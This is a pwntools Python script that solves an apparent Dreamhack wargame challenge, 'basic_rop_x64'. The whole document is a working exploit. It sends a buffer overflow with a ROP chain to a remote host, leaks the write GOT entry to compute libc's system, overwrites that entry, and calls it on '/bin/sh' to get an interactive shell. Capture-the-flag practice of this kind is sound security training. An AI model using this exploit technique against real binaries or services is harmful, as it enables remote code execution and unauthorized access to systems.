#!/usr/bin/env python2

from pwn import *

context.log_level = "debug"
context.update(arch="amd64", os="linux")

#HOST = "127.0.0.1"
#PORT = 12345

HOST = "host1.dreamhack.games"
PORT = 11007

elf = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#conn = process([elf.path, elf.path])
conn = remote(HOST, PORT)

pop_rdi = elf.address + 0x883
pop_rsi_pop_r15 = elf.address + 0x881

# You can implement this more easily as using ROP function.
payload = asm("nop") * 0x48

payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_pop_r15)
payload += p64(elf.bss())
payload += asm("nop") * 0x8
payload += p64(elf.plt["read"])

payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi_pop_r15)
payload += p64(elf.got["write"])
payload += asm("nop") * 0x8
payload += p64(elf.plt["write"])

payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_pop_r15)
payload += p64(elf.got["write"])
payload += asm("nop") * 0x8
payload += p64(elf.plt["read"])

payload += p64(pop_rdi)
payload += p64(elf.bss())
payload += p64(elf.plt["write"])

conn.sendline(payload)
conn.sendline("/bin/sh")
conn.recv()
write_got = u64(conn.recv()[:8])
libc_system = (write_got - libc.symbols["write"]) + libc.symbols["system"]

conn.send(p64(libc_system))
print(hex(libc_system))

conn.interactive()
